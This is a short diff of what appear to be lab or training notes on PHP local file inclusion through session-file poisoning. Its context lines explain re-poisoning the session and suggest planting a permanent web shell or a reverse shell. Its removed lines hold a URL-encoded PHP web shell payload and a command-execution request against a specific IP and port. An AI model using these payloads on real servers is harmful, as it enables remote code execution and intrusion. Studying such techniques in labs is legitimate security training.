@@ -27,8 +27,4 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o
 ```
 ***Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
 
-http://94.237.54.116:58945/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
-
-
-http://94.237.54.116:58945/index.php?language=/var/lib/php/sessions/sess_7hovjsk1r0jj5dcqre3ir95aqt&cmd=pwd
 
